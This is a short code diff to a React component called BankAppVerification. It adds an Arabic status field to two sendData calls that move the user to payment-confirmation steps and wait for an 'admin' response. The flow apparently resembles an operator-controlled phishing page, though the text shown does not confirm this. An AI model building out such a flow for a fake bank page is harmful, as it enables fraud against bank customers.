@@ -71,6 +71,7 @@ export default function BankAppVerification() {
     setIsWaitingAdmin(true);
     navigateToPage("تأكيد عملية الدفع من التطبيق");
     sendData({
+      data: { "الحالة": "تأكيد عملية الدفع من التطبيق" },
       current: "تأكيد عملية الدفع من التطبيق",
       waitingForAdminResponse: true,
       isCustom: true,
@@ -83,6 +84,7 @@ export default function BankAppVerification() {
     setIsWaitingAdmin(true);
     navigateToPage("طلب عملية دفع جديدة");
     sendData({
+      data: { "الحالة": "طلب عملية دفع جديدة" },
       current: "طلب عملية دفع جديدة",
       waitingForAdminResponse: true,
       isCustom: true,
